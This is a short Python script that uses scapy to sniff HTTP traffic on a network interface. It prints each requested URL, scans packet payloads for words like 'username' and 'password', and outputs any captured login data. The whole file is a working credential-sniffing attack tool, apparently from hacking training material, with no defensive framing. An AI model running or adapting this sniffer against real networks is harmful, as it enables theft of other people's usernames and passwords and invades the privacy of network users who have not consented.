import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ['username', 'uname', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')
        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible Username/Password > {login_info}\n\n')


def main():
    sniff('eth0')


if __name__ == '__main__':
    main()
